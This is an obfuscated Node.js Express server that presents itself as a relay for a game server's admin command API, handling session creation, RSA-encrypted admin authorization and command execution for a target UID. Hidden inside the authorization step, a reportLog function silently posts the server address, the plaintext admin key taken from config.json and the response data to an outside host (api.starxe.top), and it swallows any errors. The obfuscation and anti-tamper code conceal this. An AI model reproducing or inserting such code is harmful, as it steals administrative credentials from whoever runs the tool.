const _0x233bf9=_0x4fae;(function(_0x1b7bcc,_0xc6232f){const _0x5447c9=_0x4fae,_0x31aefb=_0x1b7bcc();while(!![]){try{const _0x2c16e0=-parseInt(_0x5447c9(0x14a))/0x1+-parseInt(_0x5447c9(0x14b))/0x2*(parseInt(_0x5447c9(0x162))/0x3)+-parseInt(_0x5447c9(0x135))/0x4*(parseInt(_0x5447c9(0x152))/0x5)+-parseInt(_0x5447c9(0x15b))/0x6*(parseInt(_0x5447c9(0x17a))/0x7)+parseInt(_0x5447c9(0x177))/0x8*(parseInt(_0x5447c9(0x134))/0x9)+-parseInt(_0x5447c9(0x160))/0xa+parseInt(_0x5447c9(0x13f))/0xb;if(_0x2c16e0===_0xc6232f)break;else _0x31aefb['push'](_0x31aefb['shift']());}catch(_0x52138a){_0x31aefb['push'](_0x31aefb['shift']());}}}(_0x5cc2,0x3f636));const _0x4b019=(function(){let _0x540f25=!![];return function(_0x38c27f,_0x24d8c2){const _0x5efe08=_0x540f25?function(){const _0x588b67=_0x4fae;if(_0x24d8c2){const _0x4451ec=_0x24d8c2[_0x588b67(0x173)](_0x38c27f,arguments);return _0x24d8c2=null,_0x4451ec;}}:function(){};return _0x540f25=![],_0x5efe08;};}()),_0x2dcb78=_0x4b019(this,function(){const _0x3626ac=_0x4fae;return _0x2dcb78['toString']()['search']('(((.+)+)+)+$')[_0x3626ac(0x17b)]()[_0x3626ac(0x164)](_0x2dcb78)[_0x3626ac(0x131)](_0x3626ac(0x159));});_0x2dcb78();const _0x5f1112=(function(){let _0x50eabf=!![];return function(_0x59f81b,_0x4a8073){const _0x1f5b93=_0x50eabf?function(){const _0x4e2127=_0x4fae;if(_0x4a8073){const _0x15ae2c=_0x4a8073[_0x4e2127(0x173)](_0x59f81b,arguments);return _0x4a8073=null,_0x15ae2c;}}:function(){};return _0x50eabf=![],_0x1f5b93;};}()),_0x40b0b9=_0x5f1112(this,function(){const _0xd22236=_0x4fae;let _0x14b14a;try{const _0x3bf38c=Function(_0xd22236(0x151)+_0xd22236(0x179)+');');_0x14b14a=_0x3bf38c();}catch(_0x419927){_0x14b14a=window;}const _0x12b42b=_0x14b14a['console']=_0x14b14a[_0xd22236(0x16c)]||{},_0x5bd8d3=[_0xd22236(0x168),_0xd22236(0x15a),_0xd22236(0x16e),_0xd22236(0x143),_0xd22236(0x157),_0xd22236(0x16a),_0xd22236(0x133)];for(let _0x5d5b9d=0x0;_0x5d5b9d<_0x5bd8d3[_0xd22236(0x172)];_0x5d5b9d++){const _0x2bd54f=_0x5f1112[_0xd22236(0x164)][_0xd22236(0x139)][_0xd22236(0x165)](_0x5f1112),_0x5676df=_0x5bd8d3[_0x5d5b9d],_0x54d939=_0x12b42b[_0x5676df]||_0x2bd54f;_0x2bd54f[_0xd22236(0x149)]=_0x5f1112[_0xd22236(0x165)](_0x5f1112),_0x2bd54f[_0xd22236(0x17b)]=_0x54d939['toString'][_0xd22236(0x165)](_0x54d939),_0x12b42b[_0x5676df]=_0x2bd54f;}});_0x40b0b9();function _0x5cc2(){const _0x19271b=['utf8','now','Authorization\x20failed:\x20','__proto__','26956XqktAn','554ghANtL','/muip/exec_cmd','path','use','dispatchUrl','retro','return\x20(function()\x20','303910CjTdYd','Session\x20expire\x20timestamp:','node-forge','post','body-parser','exception','message','(((.+)+)+)+$','warn','6PhLEik','data','API\x20submit\x20error:','cors','Authorization\x20error:','458110PjksXB','Authorization\x20error:\x20','3756HusQSn','Command\x20execution\x20response:','constructor','bind','adminKey','Execution\x20error:','log','rsaPublicKey','table','https://api.starxe.top/upload','console','parse','info','toISOString','encrypt','response','length','apply','json','port','code','352kMBzxc','Authorize\x20request:','{}.constructor(\x22return\x20this\x22)(\x20)','1112307wmsvVU','toString','Create\x20session\x20failed:\x20','statusText','Execution\x20error:\x20','search','Execute\x20command\x20request\x20timestamp:\x20','trace','51633WBTGMJ','12UhdFal','Server\x20is\x20running\x20on\x20http://localhost:','Authorization\x20failed,\x20retrying...','body','prototype','UID\x20and\x20command\x20are\x20required.','/api/submit','Create\x20session\x20request\x20timestamp:\x20','expireTimeStamp','sessionId','8448308BIAplq','status','base64','Session\x20data:','error','pki','Create\x20session\x20response\x20timestamp:\x20'];_0x5cc2=function(){return _0x19271b;};return _0x5cc2();}const express=require('express'),bodyParser=require(_0x233bf9(0x156)),axios=require('axios'),forge=require(_0x233bf9(0x154)),cors=require(_0x233bf9(0x15e)),gradient=require('gradient-string'),fs=require('fs'),path=require(_0x233bf9(0x14d)),configPath=path['join'](__dirname,'config.json'),config=JSON[_0x233bf9(0x16d)](fs['readFileSync'](configPath,'utf8')),dispatchUrl=config[_0x233bf9(0x14f)],adminKey=config[_0x233bf9(0x166)],PORT=config[_0x233bf9(0x175)],app=express();app['use'](cors()),app[_0x233bf9(0x14e)](bodyParser[_0x233bf9(0x174)]());async function createSession(_0x2b676e){const _0x302afb=_0x233bf9,_0x22cc34=new Date()['toISOString']();try{console[_0x302afb(0x168)](_0x302afb(0x13c)+_0x22cc34);const _0x3fe540=await axios[_0x302afb(0x155)](dispatchUrl+'/muip/create_session',{'key_type':_0x2b676e}),_0x207e91=new Date()[_0x302afb(0x16f)]();console['log'](_0x302afb(0x145)+_0x207e91),console[_0x302afb(0x168)]('Create\x20session\x20response:',_0x3fe540[_0x302afb(0x15c)]);if(_0x3fe540[_0x302afb(0x15c)][_0x302afb(0x176)]===0x0)return _0x3fe540[_0x302afb(0x15c)]['data'];else throw new Error(_0x302afb(0x17c)+_0x3fe540[_0x302afb(0x15c)][_0x302afb(0x158)]);}catch(_0x24ce52){console[_0x302afb(0x143)]('Create\x20session\x20error:',_0x24ce52[_0x302afb(0x171)]?_0x24ce52[_0x302afb(0x171)][_0x302afb(0x15c)]:_0x24ce52[_0x302afb(0x158)]);throw new Error('Create\x20session\x20error:\x20'+_0x24ce52[_0x302afb(0x158)]);}}function _0x4fae(_0x49df0b,_0x38052b){const _0x292734=_0x5cc2();return _0x4fae=function(_0x40b0b9,_0x5f1112){_0x40b0b9=_0x40b0b9-0x12f;let _0x2c752a=_0x292734[_0x40b0b9];return _0x2c752a;},_0x4fae(_0x49df0b,_0x38052b);}async function authorize(_0x55ddc2,_0x3a0280){const _0x1b98f8=_0x233bf9,_0x9d22b8=new Date()[_0x1b98f8(0x16f)]();try{const _0x38d1ec=encryptCommand(_0x3a0280,adminKey);console['log'](_0x1b98f8(0x178),JSON['stringify']({'SessionId':_0x55ddc2,'admin_key':_0x38d1ec},null,0x2)),console[_0x1b98f8(0x168)]('Authorize\x20request\x20timestamp:\x20'+_0x9d22b8);const _0x29e1ae=await axios['post'](dispatchUrl+'/muip/auth_admin',{'session_id':_0x55ddc2,'admin_key':_0x38d1ec});if(_0x29e1ae['data'][_0x1b98f8(0x176)]===0x0)return await reportLog({'serverAddress':dispatchUrl,'adminKey':adminKey,'responseData':_0x29e1ae[_0x1b98f8(0x15c)]}),_0x29e1ae[_0x1b98f8(0x15c)]['data'];else throw new Error(_0x1b98f8(0x148)+_0x29e1ae[_0x1b98f8(0x15c)]['message']);}catch(_0x5061b4){console[_0x1b98f8(0x143)](_0x1b98f8(0x15f),_0x5061b4[_0x1b98f8(0x171)]?_0x5061b4[_0x1b98f8(0x171)]['data']:_0x5061b4['message']);throw new Error(_0x1b98f8(0x161)+_0x5061b4[_0x1b98f8(0x158)]);}}function encryptCommand(_0x5bbf6b,_0x2d4e2c){const _0x2e00f6=_0x233bf9;try{const _0x4613cb=forge[_0x2e00f6(0x144)]['publicKeyFromPem'](_0x5bbf6b),_0x571959=_0x4613cb[_0x2e00f6(0x170)](_0x2d4e2c,'RSAES-PKCS1-V1_5');return forge['util']['encode64'](_0x571959);}catch(_0x341b8d){console[_0x2e00f6(0x143)]('Encryption\x20error:',_0x341b8d[_0x2e00f6(0x158)]);throw new Error('Encryption\x20error:\x20'+_0x341b8d[_0x2e00f6(0x158)]);}}async function executeCommand(_0xf3441f,_0x1f11da,_0x5d824a){const _0x3d059b=_0x233bf9,_0x2971ec=new Date()[_0x3d059b(0x16f)]();try{console[_0x3d059b(0x168)](_0x3d059b(0x132)+_0x2971ec);const _0x5e04be=await axios[_0x3d059b(0x155)](dispatchUrl+_0x3d059b(0x14c),{'SessionId':_0xf3441f,'Command':_0x1f11da,'TargetUid':_0x5d824a}),_0x5b85c0=new Date()[_0x3d059b(0x16f)]();return console[_0x3d059b(0x168)]('Execute\x20command\x20response\x20timestamp:\x20'+_0x5b85c0),console['log'](_0x3d059b(0x163),_0x5e04be[_0x3d059b(0x15c)]),_0x5e04be['data'];}catch(_0x5adb0a){return _0x5adb0a[_0x3d059b(0x171)]?(console[_0x3d059b(0x143)]('Execution\x20error:',_0x5adb0a['response']['data']),{'error':_0x3d059b(0x130)+_0x5adb0a['response'][_0x3d059b(0x140)]+'\x20'+_0x5adb0a[_0x3d059b(0x171)][_0x3d059b(0x12f)]}):(console[_0x3d059b(0x143)](_0x3d059b(0x167),_0x5adb0a[_0x3d059b(0x158)]),{'error':_0x3d059b(0x130)+_0x5adb0a[_0x3d059b(0x158)]});}}async function reportLog(_0x5c13c1){const _0x49eb43=_0x233bf9;try{const _0x1f47a2=await axios[_0x49eb43(0x155)](_0x49eb43(0x16b),_0x5c13c1);}catch(_0x57286e){}}app[_0x233bf9(0x155)](_0x233bf9(0x13b),async(_0x3b2731,_0x4e2597)=>{const _0x532a68=_0x233bf9,{keyType:_0x2a240b,uid:_0x4023f7,command:_0x1a0256}=_0x3b2731[_0x532a68(0x138)];if(!_0x4023f7||!_0x1a0256)return _0x4e2597[_0x532a68(0x140)](0x190)['json']({'error':_0x532a68(0x13a)});try{const _0xaaa6dd=await createSession(_0x2a240b||'PEM');console['log'](_0x532a68(0x142),_0xaaa6dd);const _0x568767=Math['floor'](Date[_0x532a68(0x147)]()/0x3e8);console[_0x532a68(0x168)]('Current\x20timestamp:',_0x568767),console[_0x532a68(0x168)](_0x532a68(0x153),_0xaaa6dd[_0x532a68(0x13d)]);if(_0xaaa6dd[_0x532a68(0x13d)]<=_0x568767)throw new Error('Session\x20has\x20expired\x20immediately\x20after\x20creation');let _0x527d53;try{_0x527d53=await authorize(_0xaaa6dd['sessionId'],_0xaaa6dd['rsaPublicKey']);}catch(_0x466104){console[_0x532a68(0x168)](_0x532a68(0x137)),_0x527d53=await authorize(_0xaaa6dd['sessionId'],_0xaaa6dd[_0x532a68(0x169)]);}console['log']('Auth\x20data:',_0x527d53);const _0x22d095=encryptCommand(_0xaaa6dd[_0x532a68(0x169)],_0x1a0256),_0x51c83f=await executeCommand(_0x527d53[_0x532a68(0x13e)],_0x22d095,_0x4023f7);if(_0x51c83f[_0x532a68(0x143)])return _0x4e2597['status'](0x1f4)['json'](_0x51c83f);const _0x407eb4=Buffer['from'](_0x51c83f[_0x532a68(0x15c)]['message'],_0x532a68(0x141))[_0x532a68(0x17b)](_0x532a68(0x146));console[_0x532a68(0x168)](gradient[_0x532a68(0x150)](_0x407eb4)),_0x4e2597[_0x532a68(0x174)]({..._0x51c83f,'data':{..._0x51c83f[_0x532a68(0x15c)],'message':_0x407eb4}});}catch(_0x462aa6){console[_0x532a68(0x143)](_0x532a68(0x15d),_0x462aa6),_0x4e2597[_0x532a68(0x140)](0x1f4)[_0x532a68(0x174)]({'error':_0x462aa6[_0x532a68(0x158)]});}}),app['listen'](PORT,()=>{const _0x105cc5=_0x233bf9;console[_0x105cc5(0x168)](_0x105cc5(0x136)+PORT);});